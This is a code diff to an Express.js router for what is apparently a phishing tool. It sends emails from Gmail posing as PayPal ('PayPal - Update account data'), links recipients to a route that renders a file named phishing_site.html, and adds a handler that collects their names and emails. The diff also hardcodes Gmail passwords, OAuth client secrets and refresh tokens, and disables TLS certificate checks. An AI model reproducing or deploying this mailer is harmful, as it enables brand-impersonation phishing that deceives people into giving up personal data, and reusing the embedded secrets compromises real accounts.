@@ -11,14 +11,18 @@ router.get("/emailGenerator",(req,res)=>{
 
 router.post("/sendMail",(req,res)=>{
 
-  //res.send(req.body.email)
+  var email = req.body.email
 
-  var transporter = mailer.createTransport({
+  /*var transporter = mailer.createTransport({
     service: 'Gmail',
     port: 25,
     auth: {
-      user: 'filip.tocko85@gmail.com',
-      pass: 'xxxxx'
+      type: 'OAuth2',
+      user: 'sender.msg99@gmail.com',
+      pass: 'Sender99!',
+      clientId: '676322245411-g8944etiqedhashj3pk5aas9p047f1ki.apps.googleusercontent.com',
+      clientSecret: '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',
+      refreshToken: '1//04BZHryXaDKJPCgYIARAAGAQSNwF-L9Irk5Ew6_BnPy5x1CIymMXBr4Bk4oZI6_YL6Rtb0RqvTImc-e0p1VYGLuvwaSa3Zn9VmfA'
     },
     tls: {
         rejectUnauthorized: false
@@ -29,10 +33,10 @@ router.post("/sendMail",(req,res)=>{
   var email = req.body.email
 
   var mailOptions = {
-    from: 'filip.tocko85@gmail.com',
+    from: 'sender.msg99@gmail.com',
     to: email,
-    subject: 'Site exploring',
-    html: '<p>Explore this site by clicking <a href="http://localhost:2500/api/phishing">here</a> </p>'
+    subject: 'PayPal - Update account data',
+    html: '<p>Refresh your PayPal account data by clicking <a href="http://localhost:2500/api/paypal">here</a> </p>'
   }
 
   transporter.sendMail(mailOptions, function(error, info){
@@ -43,15 +47,51 @@ router.post("/sendMail",(req,res)=>{
           console.log('E-mail is successfully sent: ' + info.response);
           res.json({"Email":"E-mail is successfully sent!"})
         }
+    })*/
+
+    var transporter = mailer.createTransport({
+      service: 'Gmail',
+      port: 25,
+      auth: {
+        type: 'OAuth2',
+        user: 'paypal.updatedata@gmail.com',
+        pass: 'paypal99',
+        clientId: '951237293848-h7i8872k2b88c0pukoakq4rgrhuk4p4e.apps.googleusercontent.com',
+        clientSecret: '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',
+        refreshToken: '1//048Ka7YIIg_XLCgYIARAAGAQSNwF-L9Ir2unKMLKsNvK4OHG0Z7-76xDbmZdoXUmR7wYfntLLBzjhN4JJReQ8uXkGOHgehsZIMxE'
+      },
+      tls: {
+          rejectUnauthorized: false
+      }
+      
     })
+  
+    var email = req.body.email
+  
+    var mailOptions = {
+      from: 'paypal.updatedata@gmail.com',
+      to: email,
+      subject: 'PayPal - Update account data',
+      html: '<p>Refresh your PayPal account data by clicking <a href="http://localhost:2500/api/paypal">here</a> </p>'
+    }
+  
+    transporter.sendMail(mailOptions, function(error, info){
+          if (error) {
+            console.log(error);
+            res.json({"Error":"Error during e-mail sending"})
+          } else {
+            console.log('E-mail is successfully sent: ' + info.response);
+            res.json({"Email":"E-mail is successfully sent!"})
+          }
+      })
 })
 
-router.get('/phishing',(req,res)=>{
+router.get('/paypal',(req,res)=>{
   res.render(__dirname+"/views/phishing_site.html",{
   })
 })
 
-router.post('/rewardData',(req,res)=>{
+router.post('/updatedData',(req,res)=>{
   var firstName = req.body.firstName
   var lastName = req.body.lastName
   var email = req.body.email
